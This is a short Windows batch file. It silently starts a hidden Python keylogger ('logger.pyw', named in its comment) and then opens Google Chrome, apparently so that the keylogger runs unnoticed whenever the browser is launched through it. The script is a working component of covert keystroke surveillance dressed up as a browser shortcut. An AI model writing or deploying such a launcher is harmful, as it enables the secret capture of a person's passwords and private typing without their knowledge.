@echo off

:: hardcoded keylogged application path
set "logger=logger.pyw"
set "path=%~dp0%logger%"

start "" %path%
start "" "c:\Program Files (x86)\Google\Chrome\Application\chrome.exe"